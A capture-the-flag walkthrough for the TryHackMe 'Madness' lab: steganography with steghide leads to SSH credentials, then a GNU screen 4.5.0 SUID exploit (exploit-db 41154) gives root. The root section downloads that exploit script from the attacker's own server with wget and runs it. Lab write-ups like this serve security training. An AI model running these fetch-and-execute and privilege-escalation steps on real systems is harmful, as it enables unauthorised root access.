---
description: https://tryhackme.com/room/madness
---

# Madness

### **user.txt**

```
nmap 10.10.175.147
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 10-01-35.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 10-03-44.png>)

```bash
wget http://10.10.175.147/thm.jpg
hexeditor thm.jpg
eog thm.jpg
# http://10.10.175.147/th1s_1s_h1dd3n/
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 10-13-09.png>)

![](../../.gitbook/assets/thm.jpg)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 10-48-45.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 10-48-49.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 10-53-55.png>)

```
steghide extract -sf thm.jpg
cat hidden.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 11-03-05.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 11-06-00.png>)

```
wget https://i.imgur.com/5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
cat password.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 11-08-15.png>)

```
ssh joker@10.10.175.147 cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 11-09-43.png>)

### **root.txt**

```bash
$ find / -type f -perm -4000 2>/dev/null
$ wget http://10.9.101.193:8000/41154.sh
$ vim 41154.sh
# :set fileformat=unix
# screen -> /bin/screen-4.5.0
# :x
$ bash 41154.sh
# cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 11-53-05.png>)

## :link: Support Material

{% embed url="https://www.exploit-db.com/exploits/41154" %}

{% embed url="https://www.cnblogs.com/zijin/p/3501912.html" %}

